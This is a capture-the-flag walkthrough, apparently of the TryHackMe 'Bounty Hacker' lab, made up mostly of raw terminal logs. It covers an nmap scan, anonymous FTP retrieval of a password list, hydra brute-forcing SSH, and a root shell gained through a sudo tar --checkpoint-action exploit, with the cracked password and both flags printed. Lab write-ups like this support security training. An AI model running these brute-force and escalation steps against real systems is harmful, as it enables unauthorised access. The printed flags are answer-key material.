# nmap

```
Nmap scan report for 10.48.153.238 (10.48.153.238)
Host is up, received user-set (0.013s latency).
Scanned at 2026-07-04 09:31:57 IST for 16s
Not shown: 967 filtered tcp ports (no-response)
PORT      STATE  SERVICE         REASON         VERSION
20/tcp    closed ftp-data        reset ttl 62
21/tcp    open   ftp             syn-ack ttl 62 vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.132.220
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp    open   ssh             syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:4a:fd:91:76:a4:32:6f:8e:1a:6a:89:fc:ab:dd:1a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7QoU8xOXJPLnjqWnW8cxcjqTyroiwDJ3scuQhw34wLLdcQvI0cF651vDBB3a65ICCRJ9qs1+BjqG1HcEws6kEK6uCGU6mjZKzMaV1mnxAXN67GRQF2X9C1u0E0K5N77ueXTyMXPQbhTdbsbkiBhT2zr39AJSIvWtVMmoqN/gmZfXhkGrJu3fYj6S8RdXzMIqTPVY7loyCQa+kgUu8s339hNbRNDm8HwH8HpU6IQl9xF9xx4IVCoLSnzuVDxQFXol7T+RVM5Z8ks93rGsuh7g6wMC4gMX/5WbiwaTQvUM1aydT0Hd22PGIsHlfnva8P1hZ5iaIKZ6rKLMIEzO72nl3kh+iVgENGrCZAeFgMeLrUIVEuqC6D3WAOquOZB48J7V8RR9vJb1Ko4F89K5GutmzxaLFR7E+1KiI6mt6UaRGqikoDx79qBcyiPMyqgVhUMk3k+HuT9w3UtNkVX/K8EIuGDSHLNSMBftAhUpo6Q0/X/Mo7jJ+dSUvTGX8aTD8E+E=
|   256 64:67:22:46:5d:70:c2:36:a7:4b:9c:4d:d1:b8:7b:ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBl4s12R4A9m33V7tQ6AC0x9y40GBKa3zMymoF/9BNZG9OsZC7jfZyWGcwbxbjrgz7UtNActm+8ZhlpT3sIHt10=
|   256 82:c9:52:0a:4e:51:19:5a:c0:e1:49:df:9c:7f:3e:15 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINqBDONTu4R4eJXuz16eXnqFvR8WsA7txuKYxImMJYp4
80/tcp    open   http            syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

# ftp

```
 🏡2060  D  C  T  bounty_hacker   main 📂  
 →  ftp 10.48.153.238
Connected to 10.48.153.238.
220 (vsFTPd 3.0.5)
Name (10.48.153.238:user): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |************************************************************************************************************************************************************************|   418        1.78 MiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (32.33 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |************************************************************************************************************************************************************************|    68      317.73 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (4.91 KiB/s)
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> exit
221 Goodbye.
 🏡2060  D  C  T  bounty_hacker   main 📂  
 →  ls
locks.txt  nmap/  task.txt
 🏡2060  D  C  T  bounty_hacker   main 📂  
 →  mkdir ftp 
 🏡2060  D  C  T  bounty_hacker   main 📂  
 →  mv locks.txt task.txt ftp/
 🏡2060  D  C  T  bounty_hacker   main 📂  
 →  ls
ftp/  nmap/
 🏡2060  D  C  T  bounty_hacker   main 📂  
 →  cat ftp/task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
 🏡2060  D  C  T  bounty_hacker   main 📂  
 →  cat ftp/locks.txt 
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

# hydra

```
hydra -l lin -P ftp/locks.txt ssh://10.48.153.238
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-04 09:46:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.48.153.238:22/
[22][ssh] host: 10.48.153.238   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-04 09:46:49
```

# ssh


# initial access

```
 ssh lin@10.48.153.238
The authenticity of host '10.48.153.238 (10.48.153.238)' can't be established.
ED25519 key fingerprint is SHA256:YMaxsLAktSk+HfEkwoLTd41x0nTMIGdAqt1MgOldbQk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.48.153.238' (ED25519) to the list of known hosts.
lin@10.48.153.238's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Mon Aug 11 12:32:35 2025 from 10.23.8.228
lin@ip-10-48-153-238:~/Desktop$ ls
user.txt
lin@ip-10-48-153-238:~/Desktop$ cat user.txt 
THM{CR1M3_SyNd1C4T3}
lin@ip-10-48-153-238:~/Desktop$
```
# privilage esclation

```
lin@ip-10-48-153-238:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on ip-10-48-153-238:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-48-153-238:
    (root) /bin/tar
lin@ip-10-48-153-238:~/Desktop$
lin@ip-10-48-153-238:/home$ sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# ls
lin  ubuntu
# cd /root
# ls
root.txt  snap
# cat root.txt
THM{80UN7Y_h4cK3r}
```
